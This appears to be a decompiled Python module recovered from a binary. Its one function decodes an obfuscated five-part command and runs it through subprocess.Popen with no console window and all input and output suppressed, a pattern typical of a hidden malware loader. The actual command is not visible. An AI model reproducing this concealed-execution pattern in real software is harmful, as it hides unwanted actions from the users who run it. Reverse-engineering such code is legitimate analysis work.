# Recovered module: src.py.com.yun.mao.kv_nx.mo_d9_vy_m8
# Entry confirmed by module init at 0x5744010 and the terminal constants row.
from __future__ import annotations

import subprocess

from ..link._fds_jm import sec


def bd_s8_go() -> None:
    """Launch the encoded five-part command without a console window.

    Inferred: the original body builds a five-element list and forwards the
    shell/stdin/stdout/stderr/creationflags keywords to Popen.
    """
    _sp = subprocess
    _exe = sec(r"zp_uq_6n")
    _args = [
        sec(r"bv_lt_8p"),
        sec(r"cw_rj_1a"),
        sec(r"dy_sk_5e"),
        sec(r"ez_um_2w"),
    ]
    _cf = _sp.CREATE_NO_WINDOW
    _sp.Popen(
        [_exe, *_args],
        shell=False,
        stdin=_sp.DEVNULL,
        stdout=_sp.DEVNULL,
        stderr=_sp.DEVNULL,
        creationflags=_cf,
    )
